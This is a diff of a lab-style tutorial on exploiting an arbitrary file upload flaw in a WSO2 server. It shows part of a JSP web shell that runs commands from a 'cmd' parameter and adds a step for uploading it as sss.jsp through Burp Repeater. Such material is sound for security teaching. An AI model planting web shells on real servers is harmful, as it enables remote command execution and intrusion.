@@ -100,7 +100,7 @@ Now, send the caught request to Repeater, using the **Ctrl+R** keyboard shortcut
 
 <img src="./assets/burp_repeater_dark.png" width=800 height=400>
 
-As we said before, we can upload any file on the WSO2 server, so we will try to upload a web shell file with the following content:
+As we said before, we can upload any file on the WSO2 server -- we want a file that can interpret commands: we will try to upload a web shell jsp file with the following content:
 
 ```jsp
 <%@ page import="java.util.*,java.io.*"%>
@@ -129,6 +129,11 @@ if (request.getParameter("cmd") != null) {
 </pre>
 </BODY></HTML>
 ```
+
+Let's modify the request and send a new request containing the web shell file having the name ```sss.jsp```. This file will be uploaded at the ```authenticationendpoint/sss.jsp``` endpoint.
+
+<img src="./assets/crafted_request.png" width=800 height=400>
+
 
 # Further reading
 
